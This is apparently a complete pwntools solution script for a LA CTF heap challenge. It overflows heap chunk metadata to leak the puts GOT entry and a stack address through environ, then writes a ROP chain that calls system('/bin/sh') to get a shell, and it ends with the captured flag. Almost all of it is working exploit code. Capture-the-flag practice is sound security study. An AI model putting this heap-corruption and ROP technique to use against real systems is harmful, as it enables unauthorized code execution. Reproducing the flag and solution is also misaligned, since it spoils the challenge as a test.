from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

# p = gdb.debug('./chall', '''
#     b *(menu+204)
#     b *(menu+216)
#     b *(menu+228)
#     b *(menu+240)
#     b *(menu+252)        
#     continue
# ''')

p = remote('chall.lac.tf', 31338)

def create_level(index):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Enter level index: ', str(index).encode())

def edit_level(data):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'Enter level data: ', data)

def test_level():
    p.sendlineafter(b'Choice: ', b'3')
    p.recvuntil(b'Level data: ')
    data = p.recvline().strip()
    return data

def explore(index):
    p.sendlineafter(b'Choice: ', b'4')
    p.sendlineafter(b'Enter level index: ', str(index).encode())

def reset():
    p.sendlineafter(b'Choice: ', b'5')

e = ELF('./chall')
glibc_e = ELF('libc.so.6')

p.recvuntil(b'A welcome gift: ')
base_addr = int(p.recvline().strip(), 16)-e.symbols.main
log.info(f'base: {hex(base_addr)}')

create_level(0)
create_level(1)
create_level(2)

explore(0)
edit_level(b'A'*0x28 + p64(0x71) + p64(base_addr+e.got.puts-0x40))
reset()

explore(1)
explore(0)
glibc_base_addr = u64(test_level()[0:6].ljust(8, b"\x00"))-glibc_e.symbols.puts
log.info(f'glibc base: {hex(glibc_base_addr)}')
reset()

glibc_r = ROP("libc.so.6")
chain = [
    glibc_base_addr+glibc_r.rdi.address,
    glibc_base_addr+next(glibc_e.search(b"/bin/sh")),
    glibc_base_addr+glibc_r.ret.address,
    glibc_base_addr+glibc_e.symbols.system
]

explore(0)
edit_level(b'B'*0x28 + p64(71) + p64(glibc_base_addr+glibc_e.symbols.environ-0x40))
reset()

explore(1)
explore(0)
edit_level_return_addr = u64(test_level()[0:6].ljust(8, b"\x00"))-0x150
log.info(f'edit level return: {hex(edit_level_return_addr)}')
reset()

explore(0)
edit_level(b'C'*0x28 + p64(71) + p64(edit_level_return_addr-0x40))
reset()

explore(1)
explore(0)
edit_level(b"".join([p64(addr) for addr in chain]))

p.interactive()

# lactf{ro9u3_LIk3_No7_R34LlY_RO9U3_H34P_LIK3_nO7_r34llY_H34P}
